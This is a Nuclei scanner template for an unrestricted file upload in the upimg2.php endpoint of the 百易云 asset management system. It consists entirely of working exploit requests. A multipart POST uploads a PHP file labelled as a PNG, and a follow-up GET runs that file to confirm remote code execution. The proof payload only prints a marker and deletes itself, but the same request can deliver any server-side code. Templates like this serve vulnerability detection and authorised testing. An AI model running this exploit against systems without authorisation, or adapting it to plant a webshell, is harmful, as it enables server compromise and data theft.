id: baiyishequ-upimg2-fileupload
info:
  name: 百易云资产管理运营系统 upimg2.php - fileupload
  author: leadlife
  severity: critical
  description: 
  reference: 
    - demo
  classification:
    cve-id: 
  metadata:
    verified: true
    fofa-query: demo
  tags: baiyishequ,fileupload

variables:
    filename: "{{to_lower(rand_base(4))}}"
    date: '{{date_time("%Y%M%D%H%M%S")}}'

http:
  - raw:
      - |
        POST /upimg2.php HTTP/1.1
        Host: {{Hostname}}
        Content-Type: multipart/form-data; boundary=---------------------------289666258334735365651210512949
        User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:127.0) Gecko/20100101 Firefox/127.0
        Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
        Accept-Encoding: gzip, deflate
        X-Requested-With: XMLHttpRequest
        Content-Length: 218

        -----------------------------289666258334735365651210512949
        Content-Disposition: form-data; name="file"; filename="1.php"
        Content-Type: image/png

        <?php print("{{randstr}}");unlink(__FILE__);?>
        -----------------------------289666258334735365651210512949--
        
      - |+
        GET /{{extracted-filename}} HTTP/1.1
        Host: {{Hostname}}


    extractors: 
      - type: json
        part: body_1
        internal: true
        name: extracted-filename
        json:
          - ".imgurl"

    matchers:
      - type: dsl
        dsl:
          - status_code_1 == 200 && status_code_2 == 200
          - contains(body_2,'{{randstr}}')
        condition: and